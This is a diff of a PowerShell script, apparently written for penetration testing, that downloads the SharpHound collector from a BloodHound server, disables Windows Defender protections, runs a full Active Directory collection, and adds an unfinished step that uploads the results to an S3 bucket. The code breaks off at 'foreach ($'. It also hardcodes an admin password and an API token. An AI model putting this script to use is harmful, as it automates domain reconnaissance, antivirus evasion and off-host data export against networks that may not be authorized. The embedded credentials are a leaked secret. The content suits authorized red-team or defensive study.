@@ -3,41 +3,18 @@
 	Installs and runs the Sharphound data collector.
 
 	.DESCRIPTION
-	Installs the Sharphound data collector from a running Bloodhound instance and runs a scan querying all the domain info.
+	Installs the Sharphound data collector from a running Bloodhound instance and runs a scan querying all the domain info and uploads the results to an Amazon S3 Bucket.
 
 	.PARAMETER BloodhoundIP
 	Specifies the IP address of the machine running Bloodhound where the API request for downloading Sharphound will be sent.
 
-	.PARAMETER BloodhoundPort
-	Specifies the port number on the machine running Bloodhound where the API request for downloading Sharphound will be sent.
-
-	.PARAMETER TokenKey
-	Specifies the Bloodhound API token key used for authenticating on the Bloodhound API.
-
-	.PARAMETER TokenID
-	Specifies the Bloodhound API token ID for the TokenKey used.
-
-	.PARAMETER TLS
-	Specifies whether the request to the Bloodhound API should be made over 'https://'.
-
 	.EXAMPLE
-	PS> .\sharphound.ps1 -BloodhoundIP 10.10.10.5 -BloodhoundPort 8080 -TokenKey LXeVkQGxqCDOG4CXXsiQBPj3In6ACWc5/yyd66IgeBDUqNcZ/rqCaA== -TokenID 1426fdbd-10dc-44ab-a3a4-e28e045412fa
-
-	.EXAMPLE
-	PS> .\sharphound.ps1 -BloodhoundIP 10.10.10.5 -BloodhoundPort 8080 -TokenKey LXeVkQGxqCDOG4CXXsiQBPj3In6ACWc5/yyd66IgeBDUqNcZ/rqCaA== -TokenID 1426fdbd-10dc-44ab-a3a4-e28e045412fa -TLS
+	PS> .\sharphound.ps1 -BloodhoundIP 10.10.10.5
 #>
 
 param(
 	[Parameter(Mandatory=$true)]
-	[string] $BloodhoundIP,
-	[Parameter(Mandatory=$false)]
-	[string] $BloodhoundPort,
-	[Parameter(Mandatory=$true)]
-	[string] $TokenKey,
-	[Parameter(Mandatory=$true)]
-	[string] $TokenID,
-	[Parameter(Mandatory=$false)]
-	[switch] $TLS
+	[string] $BloodhoundIP
 )
 
 
@@ -146,96 +123,63 @@ function CleanUp
 
 
 # Variables
-$totalScriptTasks = 6
+# Progress
+$totalScriptTasks = 9
 $currentScriptTask = 1
+
+# Paths
 $tempPath = "$env:TEMP"
 $sharphoundZipPath = "$tempPath\sharphound.zip"
 $sharphoundPath = "$tempPath\sharphound"
 $sharphoundResultsPath = "$tempPath\SharphoundResults"
-$sharphoundExe = "$sharphoundPath\Sharphound.exe"
+$sharphoundExePath = "$sharphoundPath\Sharphound.exe"
 
+# API
+$BLOODHOUND_IP = $BloodhoundIP
+$BLOODHOUND_PORT = 8080
+$BLOODHOUND_BASE_URL = "${BLOODHOUND_IP}:${BLOODHOUND_PORT}"
+$SHARPHOUND_DOWNLOAD_ENDPOINT = "/api/v2/collectors/sharphound/latest"
 
-# Script Start
-Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Checking TLS requirement..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
-$currentScriptTask = $currentScriptTask + 1
+# Login to Bloodhound and get JWT
+$BLOODHOUND_LOGIN_ENDPOINT = "/api/v2/login"
+$BLOODHOUND_USERNAME = "admin"
+$BLOODHOUND_PASSWORD = "gtSS29rPHOG28^meGyqE"
+$LOGIN_METHOD = "secret"
 
-if ($TLS)
-{
-	$BASE_URL = "https://${BloodhoundIP}:${BloodhoundPort}"
-} else
-{
-	$BASE_URL = "http://${BloodhoundIP}:${BloodhoundPort}"
+$body = @{
+	login_method = $LOGIN_METHOD
+	secret = $BLOODHOUND_PASSWORD
+	username = $BLOODHOUND_USERNAME
 }
 
-$SHARPHOUND_DOWNLOAD_URI = "/api/v2/collectors/sharphound/latest"
-$METHOD = "GET"
+$jsonBody = $body | ConvertTo-Json
 
-Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Building signature..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+Write-Host "<PROGRESS>[*] STEP $currentScriptTask / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Fetching JWT from Bloodhound API..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
 $currentScriptTask = $currentScriptTask + 1
 
-$totalSignatureBuildTasks = 4
-$currentSignatureBuildTask = 1
+try
+{
+	Write-Host "[*] Fetching JWT..." -ForegroundColor Cyan
+	
+	$loginResponse = Invoke-RestMethod -Uri "$BLOODHOUND_BASE_URL$BLOODHOUND_LOGIN_ENDPOINT" -Method POST -Body $jsonBody -ContentType "application/json" -ErrorAction Stop
 
-# Calculate the HMAC signature digest required by Bloodhound to accept the request
-
-# Setup HMAC SHA256 Digester
-Write-Progress -Activity "Building HMAC SHA256 Signature" -CurrentOperation "Setting up HMAC SHA256 digester..." -Id 1 -ParentId 0 -PercentComplete (($currentSignatureBuildTask / $totalSignatureBuildTasks) * 100)
-$currentSignatureBuildTask = $currentSignatureBuildTask + 1
-
-$digester = New-Object System.Security.Cryptography.HMACSHA256
-$tokenKeyBytes = [Text.Encoding]::ASCII.GetBytes($TokenKey)
-$digester.Key = $tokenKeyBytes
-
-
-# Step 1: Compute HMAC for the OperationKey (Method + URI)
-Write-Progress -Activity "Building HMAC SHA256 Signature" -CurrentOperation "Generating OperationKey HMAC digest..." -Id 1 -ParentId 0 -PercentComplete (($currentSignatureBuildTask / $totalSignatureBuildTasks) * 100)
-$currentSignatureBuildTask = $currentSignatureBuildTask + 1
-
-$operationKey = "$METHOD$SHARPHOUND_DOWNLOAD_URI"
-$operationKeyBytes = [Text.Encoding]::ASCII.GetBytes($operationKey)
-$operationKeyDigest = $digester.ComputeHash($operationKeyBytes)
-
-
-# Step 2: Compute HMAC for the DateKey (RFC3339)
-Write-Progress -Activity "Building HMAC SHA256 Signature" -CurrentOperation "Generating DateKey HMAC digest..." -Id 1 -ParentId 0 -PercentComplete (($currentSignatureBuildTask / $totalSignatureBuildTasks) * 100)
-$currentSignatureBuildTask = $currentSignatureBuildTask + 1
-
-$digester.Key = $operationKeyDigest
-$datetime = (Get-Date).ToString("yyyy-MM-dd'T'HH:mm:ss.fffffffzzz")
-$datetimeBytes = [Text.Encoding]::ASCII.GetBytes($datetime.Substring(0,13))
-$datetimeDigest = $digester.ComputeHash($datetimeBytes)
-
-# Step 3: Encode signature in Base64
-Write-Progress -Activity "Building HMAC SHA256 Signature" -CurrentOperation "Generating final HMAC digest..." -Id 1 -ParentId 0 -PercentComplete (($currentSignatureBuildTask / $totalSignatureBuildTasks) * 100)
-$currentSignatureBuildTask = $currentSignatureBuildTask + 1
-
-$digester.Key = $datetimeDigest
-$emptyString = ""
-$emptyStringBytes = [Text.Encoding]::ASCII.GetBytes($emptyString)
-$finalDigest = $digester.ComputeHash($emptyStringBytes)
-
-Write-Progress -Activity "Building HMAC SHA256 Signature" -Id 1 -ParentId 0 -Completed
-
-Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Base64 encoding final HMAC digest..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
-$currentScriptTask = $currentScriptTask + 1
-
-# Encode the final digest to Base64
-$base64Signature = [Convert]::ToBase64String($finalDigest)
-
-
-$HEADERS = @{
-	"Accept" = "Application/octet-stream"
-	"Prefer" = "0"
-	"Authorization" = "bhesignature $TokenID"
-	"RequestDate" = $datetime
-	"Signature" = $base64Signature
-	"Content-Type" = "application/json"
+	$JWT = $loginResponse.data.session_token
+	
+	Write-Host "[*] Fetched JWT..." -ForegroundColor Cyan
+} catch
+{
+	Write-Error "[!] Failed to fetch JWT..."
+	Write-Error $_.Exception.Message
+	exit 1
 }
-
-$FINAL_URL = "$BASE_URL$SHARPHOUND_DOWNLOAD_URI"
 
 # Disable Windows Virtus and Threat Protection
 Write-Warning "[*] Installing/Running Sharphound requires Windows Protection to be disabled temporarily..."
+
+Write-Host "<PROGRESS>[*] STEP $currentScriptTask / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Disabling Windows Protection temporarily..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
 
 # Original values
 $realtimeMonitoringOriginal = (Get-MpPreference).DisableRealtimeMonitoring
@@ -245,14 +189,19 @@ $submitSamplesConsentOriginal = (Get-MpPreference).SubmitSamplesConsent
 ManageWindowsProtection -Disable
 
 # Downloading Sharphound archive from Bloodhound API
+$HEADERS = @{
+	"Authorization" = "Bearer $JWT"
+}
+
+Write-Host "<PROGRESS>[*] STEP 3 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Downloading Sharphound archive from Bloodhound API..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
 try
 {
-	Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Downloading Sharphound archive from Bloodhound API..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
-	$currentScriptTask = $currentScriptTask + 1
-
 	Write-Host "[*] Downloading Sharphound..." -ForegroundColor Cyan
 
-	Invoke-WebRequest -Uri $FINAL_URL -Method $METHOD -Headers $HEADERS -Outfile $sharphoundZipPath -ErrorAction Stop
+	Invoke-RestMethod -Uri "$BLOODHOUND_BASE_URL$SHARPHOUND_DOWNLOAD_ENDPOINT" -Method GET -Headers $HEADERS -Outfile $sharphoundZipPath -ErrorAction Stop
 
 	Write-Host "[*] Downloaded Sharphound into $sharphoundZipPath." -ForegroundColor Cyan
 } catch
@@ -268,6 +217,7 @@ try
 # Extracting downloaded Sharphound archive
 try
 {
+	Write-Host "<PROGRESS>[*] STEP 4 / $totalScriptTasks</PROGRESS>"
 	Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Extracting Sharphound archive..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
 	$currentScriptTask = $currentScriptTask + 1
 
@@ -288,22 +238,36 @@ try
 	exit 1
 }
 
-# Sharphound scan
+# Create directory for Sharphound results
+Write-Host "<PROGRESS>[*] STEP 5 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Creating directory for Sharphound results..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
 try
 {
-	Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Running Sharphound scan..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
-	$currentScriptTask = $currentScriptTask + 1
-
-	Write-Host "[*] Running Sharphound..." -ForegroundColor Cyan
-	
 	Write-Host "[*] Creating Sharphound results directory $sharphoundResultsPath..." -ForegroundColor Cyan
-	New-Item -Path $sharphoundResultsPath -ItemType Directory -Force
+	New-Item -Path $sharphoundResultsPath -ItemType Directory -Force -ErrorAction Stop
 	Write-Host "[*] Created Sharphound results directory $sharphoundResultsPath." -ForegroundColor Cyan
-
-	Start-Process -Wait -FilePath $sharphoundExe -ArgumentList "-c All --OutputDirectory $sharphoundResultsPath" -ErrorAction Stop
+} catch
+{
+	Write-Error "[!] Failed to create directory: '$sharphoundResultsPath'."
+	Write-Error $_.Exception.Message
 	
-	$createdZipFiles = (Get-ChildItem -Path $sharphoundResultsPath -Filter "*_Bloodhound.zip").Name -join ", "
+	RemoveSharphoundZip
+	
+	exit 1
+}
 
+# Run Sharphound scan
+Write-Host "<PROGRESS>[*] STEP 6 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Running Sharphound scan..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
+try
+{
+	Write-Host "[*] Running Sharphound..." -ForegroundColor Cyan
+	Start-Process -Wait -FilePath $sharphoundExePath -ArgumentList "-c All --OutputDirectory $sharphoundResultsPath" -ErrorAction Stop
+	$createdZipFiles = (Get-ChildItem -Path $sharphoundResultsPath -Filter "*_Bloodhound.zip").Name -join ", "
 	Write-Host "[*] Sharphound scan is done. The results are contained in the following zip files: $createdZipFiles" -ForegroundColor Cyan
 } catch
 {
@@ -318,8 +282,48 @@ try
 	exit 1
 }
 
+Write-Host "<PROGRESS>[*] STEP 7 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Resetting Windows Protection..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
 # Reset Windows Protection
 ManageWindowsProtection -Reset
+
+# Install required AWS.Tools modules
+Write-Host "<PROGRESS>[*] STEP 8 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Installing required 'AWS.Tools' PowerShell modules..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
+try
+{
+	Write-Host "[*] Installing 'AWS.Tools.Installer' PowerShell module..." -ForegroundColor Cyan
+	Install-Module -Name AWS.Tools.Installer -Force -ErrorAction Stop
+	Write-Host "[*] Installed 'AWS.Tools.Installer' PowerShell module." -ForegroundColor Cyan
+	
+	Write-Host "[*] Installing 'AWS.Tools.S3' PowerShell module..." -ForegroundColor Cyan
+	Install-AWSToolsModule AWS.Tools.S3 -CleanUp -Force
+	Write-Host "[*] Installed 'AWS.Tools.S3' PowerShell module." -ForegroundColor Cyan
+} catch
+{
+	Write-Error "[!] Failed to install 'AWS.Tools' module."
+	Write-Error $_.Exception.Message
+	
+	RemoveSharphoundZip
+	RemoveSharphoundFolder
+	
+	exit 1
+}
+
+# Upload Sharphound scan results to S3 Bucket
+$S3_OBJECT_PREFIX = 
+
+Write-Host "<PROGRESS>[*] STEP 9 / $totalScriptTasks</PROGRESS>"
+Write-Progress -Activity "Sharphound Installation and Scan" -CurrentOperation "Uploading Sharphound results to Amazon S3..." -Id 0 -PercentComplete (($currentScriptTask / $totalScriptTasks) * 100)
+$currentScriptTask = $currentScriptTask + 1
+
+Write-Host "<S3BUCKET></S3BUCKET>"
+
+foreach ($
 
 # Clean up
 CleanUp
